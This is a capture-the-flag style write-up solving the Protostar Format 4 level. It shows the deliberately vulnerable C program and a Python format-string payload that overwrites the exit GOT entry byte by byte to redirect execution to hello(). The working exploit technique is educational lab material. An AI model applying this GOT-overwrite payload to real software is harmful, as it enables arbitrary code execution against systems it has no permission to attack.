# A-short-solution-to-Protostar-level-Format-4
## the c code
Here's the source code 
```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void hello()
{
  printf("code execution redirected! you win\n");
  _exit(1);
}

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);

  printf(buffer);

  exit(1);   
}

int main(int argc, char **argv)
{
  vuln();
}
```
As you can see the main function calls vuln() which calls fgets to take input in the buffer and the print it via printf() and *then calls the exit function*
Our aim is to redirect the code execution to hello(). This is an easy problem so I will only *very* briefly explain the basic idea behind the soution. 

Since there is a exit call, there is no use of overwriting the return address pointer on the stack.

To redirect the code execution, we simply go to procedure linkage table of the program which will lead us to the exit address on the Global offset table.
Now we exploit the format string exploit to overwrite it. 
Now the usual solutions you will see on internet(like the one on the live overflow website) involve overwriting it in two parts using format specifier %n and some little neat tricks with their modifiers.
But half the hexadecimal address is still a very large number in decimal. We have to print thousands of blank spaces to achieve that overwrite.

What we can do instead is write the address in four passes writing 1 byte in each passes. We can significantly reduce the number of printed characters from tens of thousands to a few hundred. 
There will be over flow in each write but that will get overwritten in the next pass and in the 4th pass the overflow will be to the next memory adress (with reference to the script it'll be at EXIT4) but since we care only about 4 bytes it'll work

Note that the code will only run on protostarOS for obvious reasons.
##Here's the actual python code to do so
```
HELLO = 0x080484b4
EXIT = 0x08049724
EXIT1 = 0x8049725
EXIT2 = 0x8049726
EXIT3 = 0x8049727
EXIT4 = 0x8049728
def pad(s):
   return s+"X"*(512-len(s))

exploit = ""
exploit+= "AAAA"
exploit+= struct.pack("I",EXIT)
exploit+= struct.pack("I",EXIT1)
exploit+= struct.pack("I",EXIT2)
exploit+= struct.pack("I",EXIT3)
exploit+= struct.pack("I",EXIT4)

exploit+= "i%4$155x%5$n%208x%6$n%128x%7$n%260x%8$n"

print pad(exploit)
```
